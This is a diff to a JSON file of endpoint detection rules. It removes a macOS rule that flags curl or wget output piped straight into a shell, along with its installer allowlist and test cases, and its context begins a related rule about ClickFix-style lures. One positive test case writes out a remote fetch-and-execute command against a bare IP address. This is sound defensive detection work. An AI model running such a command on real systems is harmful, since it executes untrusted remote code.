@@ -4492,63 +4492,6 @@
    }
   },
   {
-   "id": "macos-curl-pipe-shell",
-   "name": "Remote script piped into a shell",
-   "description": "curl or wget output piped straight to sh, bash or zsh.",
-   "tactic": "Execution",
-   "technique": "T1059.004",
-   "technique_name": "Command and Scripting Interpreter: Unix Shell",
-   "severity": "high",
-   "os": "macos",
-   "event_type": "process",
-   "match": {
-    "all": [
-     {
-      "field": "command",
-      "op": "regex",
-      "pattern": "\\b(curl|wget)\\b[^|]*\\|\\s*(sudo\\s+)?(/bin/)?(ba|z|da)?sh\\b"
-     },
-     {
-      "not": {
-       "field": "command",
-       "op": "contains",
-       "patterns": [
-        "homebrew/install",
-        "get.docker.com",
-        "sh.rustup.rs",
-        "install.python-poetry.org",
-        "ohmyzsh"
-       ]
-      }
-     }
-    ]
-   },
-   "tags": [
-    "macos",
-    "curl",
-    "installer"
-   ],
-   "batch": "a2-macos",
-   "tests": {
-    "positive": [
-     {
-      "executable": "/bin/bash",
-      "command": "bash -c 'curl -fsSL http://1.2.3.4/x.sh | bash'"
-     }
-    ],
-    "negative": [
-     {
-      "executable": "/bin/bash",
-      "command": "bash -c 'curl -fsSL https://sh.rustup.rs | sh'"
-     },
-     {
-      "executable": "/usr/bin/curl",
-      "command": "curl -O https://example.com/a.sh"
-     }
-    ]
-   }
-  },
-  {
    "id": "macos-bash-command-substitution-curl",
    "name": "bash -c with curl command substitution",
    "description": "bash -c \"$(curl ...)\" executes a remote script, as ClickFix-style lures instruct.",
